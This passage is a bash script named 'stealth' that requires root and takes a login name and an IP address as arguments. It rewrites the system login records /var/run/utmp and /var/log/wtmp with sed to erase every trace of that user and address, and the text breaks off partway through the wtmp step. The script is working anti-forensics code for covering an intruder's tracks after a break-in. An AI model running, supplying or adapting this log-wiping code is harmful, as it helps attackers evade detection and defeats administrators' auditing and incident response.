#!/bin/bash
clear
ROOT_UID=0
if [ "$UID" -ne "$ROOT_UID" ]
then
  echo "    Termination of the script in 15 seconds"
  echo "    ---------------------------------------"
  echo "            You have no uid ROOT"
  echo "             Permission denied!"
  echo
  echo "Your login (`whoami`):"
  echo "`id`"
  sleep 15
  exit $E_NOTROOT
fi
rm -f /tmp/time*

if [ $# -lt 2 ]; then
  echo "################################################"
  echo "#                                              #"
  echo "#              Bad LOGIN or IP!                #"
  echo "#             ------------------               #"
  echo "#          Repeat rekeying, please.            #"
  echo "#                                              #"    
  echo "#     Example:  ./stealth login ip             #"      
  echo "################################################"
  echo 
  echo "Usage: $0 root 192.168.0.3"
  echo
 exit 1
fi

login=$1
ip=$2

if [ "$login" != "" ]; then    
 if [ "$ip" != "" ]; then
    l_f=$(echo "$login") #result who array
    ip_f=$(echo "$ip")   #ip-address
    echo "Searching for of the files (utmp,wtmp,lastlog)"
    echo "Please wait several minutes..."
    utmp_f='/var/run/utmp'
    if [ -e $utmp_f ];then
      sed -e "s/$ip_f//g" $utmp_f > $utmp_f.$$ 2>/dev/null 
      mv $utmp_f.$$ $utmp_f      
      sed -e "s/$l_f//g" $utmp_f > $utmp_f.$$ 2>/dev/null 
      mv $utmp_f.$$ $utmp_f      
    else
      utmp=$(find / -type f -name 'utmp')
      sed -e "s/$ip_f//g" $utmp > $utmp.$$ 2>/dev/null 
      mv $utmp.$$ $utmp      
      sed -e "s/$l_f//g" $utmp > $utmp.$$ 2>/dev/null 
      mv $utmp.$$ $utmp
    fi
    
    wtmp_f='/var/log/wtmp'
    if [ -e $wtmp_f ];then
      sed -e "s/$ip_f//g" $wtmp_f >